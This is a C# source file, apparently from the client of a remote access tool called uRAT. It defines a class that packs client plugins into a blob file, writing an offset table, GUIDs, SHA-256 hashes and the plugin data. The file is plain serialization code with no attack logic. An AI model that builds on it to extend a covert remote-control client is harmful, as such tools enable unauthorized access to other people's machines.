using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uRAT.Client.Plugin;

namespace uRAT.Client.Tools.Blob
{
    internal class PluginBlobWriter : IDisposable
    {
        private struct PluginOffsetSizePair
        {
            public int Offset;
            public int Size;

            public PluginOffsetSizePair(int offset, int size)
            {
                Offset = offset;
                Size = size;
            }
        }

        private BlobWriter _writer;
        private PluginBlobMetadata _md;

        public PluginBlobWriter(string blobFile)
        {
            using (var lol = new PluginBlobReader(blobFile))
            {
                _md = lol.ReadMetadata();
            }
            var fs = new FileStream(blobFile, FileMode.Truncate);
            _writer = new BlobWriter(fs);
        }

        public void AppendPlugin(BlobClientPlugin plugin)
        {
            if (_md.PluginTable.ContainsKey(plugin.PluginGuid))
                return;
            _md.AvailablePluginCount++;
            _md.PluginTable.Add(plugin.PluginGuid, plugin);
        }

        public void ReplacePlugin(Guid pluginGuid, BlobClientPlugin newPlugin)
        {
            if (!_md.PluginTable.ContainsKey(pluginGuid))
                return;
            _md.PluginTable[pluginGuid] = newPlugin;
        }

        public void RemovePlugin(Guid pluginGuid)
        {
            if (!_md.PluginTable.ContainsKey(pluginGuid))
                return;
            _md.AvailablePluginCount--;
            _md.PluginTable.Remove(pluginGuid);
        }

        public void WriteBlob()
        {
            Dictionary<Guid, PluginOffsetSizePair> offsets = new Dictionary<Guid, PluginOffsetSizePair>();
            // create data block
            byte[] dataBlock;
            using (var ms = new MemoryStream())
            {
                foreach (var plugin in _md.PluginTable)
                {
                    offsets.Add(plugin.Value.PluginGuid,
                        new PluginOffsetSizePair((int) ms.Position, plugin.Value.Data.Length));
                    ms.Write(plugin.Value.PluginGuid.ToByteArray(), 0, 16);
                    ms.Write(HashHelper.CalculateSha256(plugin.Value.Data), 0, 32);
                    ms.Write(plugin.Value.Data, 0, plugin.Value.Data.Length);
                }
                dataBlock = ms.ToArray();
            }
            _writer.BaseStream.Position = 0;
            // write metadata
            _writer.Write(_md.AvailablePluginCount);
            foreach (var plugin in _md.PluginTable)
            {
                _writer.Write(offsets[plugin.Value.PluginGuid].Offset + 4 + _md.PluginTable.Count*24);
                _writer.Write(offsets[plugin.Value.PluginGuid].Size);
                _writer.Write(plugin.Value.PluginGuid.ToByteArray());
            }
            _writer.Write(dataBlock);
        }

        public void Dispose()
        {
            _writer.Close();
        }
    }
}
